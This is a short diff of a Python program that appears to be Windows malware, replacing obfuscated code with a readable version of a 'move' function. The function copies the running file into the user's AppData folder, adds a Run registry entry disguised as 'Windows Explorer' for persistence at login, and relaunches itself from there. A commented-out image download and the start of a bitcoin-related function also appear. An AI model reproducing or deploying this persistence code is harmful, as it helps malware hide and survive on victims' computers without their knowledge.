@@ -3,15 +3,20 @@ import detailes #line:2:import detailes
 import subprocess #line:3:import subprocess
 import os #line:4:import os
 import sys #line:5:import sys
-def move ():#line:6:def move():
-    OO000OO0OOO0OO000 =os .environ ['appdata']#line:7:APPDATA = os.environ['appdata']
-    OO0OOOO0O0O0OO00O =os .environ ['appdata']+"\\"+os .path .basename (sys .argv [0 ])#line:8:new_file_name = os.environ['appdata'] + "\\" + os.path.basename(sys.argv[0])
-    if not os .path .exists (OO0OOOO0O0O0OO00O ):#line:9:if not os.path.exists(new_file_name):
-        OOO0000OO00000OOO =os .path .join (OO000OO0OOO0OO000 ,os .path .basename (sys .argv [0 ]))#line:15:new_loc = os.path.join(APPDATA, os.path.basename(sys.argv[0]))
-        subprocess .Popen (f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Explorer" /t REG_SZ /d "{OO0OOOO0O0O0OO00O}"',shell =True )#line:16:subprocess.Popen(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Explorer" /t REG_SZ /d "{new_file_name}"',shell=True)
-        O0OOO00OO0O000000 =f'timeout 2 & move /y {os.path.basename(sys.argv[0])} {OOO0000OO00000OOO} & cd /d {OO000OO0OOO0OO000}\\ & {new_loc}'#line:17:command = f'timeout 2 & move /y {os.path.basename(sys.argv[0])} {new_loc} & cd /d {APPDATA}\\ & {new_loc}'
-        subprocess .Popen (O0OOO00OO0O000000 ,shell =True )#line:18:subprocess.Popen(command, shell=True)
-        sys .exit (0 )#line:19:sys.exit(0)
+def move():
+    APPDATA = os.environ['appdata']
+    new_file_name = os.environ['appdata'] + "\\" + os.path.basename(sys.argv[0])
+    if not os.path.exists(new_file_name):
+        #import urllib.request
+        #urllib.request.urlretrieve(
+        #    "https://media.istockphoto.com/photos/abstract-warning-of-a-detected-malware-program-picture-id1299483011",
+        #    "pic.png")
+        #subprocess.Popen("pic.png", shell=True)
+        new_loc = os.path.join(APPDATA, os.path.basename(sys.argv[0]))
+        subprocess.Popen(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Explorer" /t REG_SZ /d "{new_file_name}"',shell=True)
+        command = f'timeout 2 & move /y {os.path.basename(sys.argv[0])} {new_loc} & cd /d {APPDATA}\\ & {new_loc}'
+        subprocess.Popen(command, shell=True)
+        sys.exit(0)
 def btcs ():#line:20:def btcs():
     from hashlib import sha256 #line:21:from hashlib import sha256
     import subprocess #line:22:import subprocess
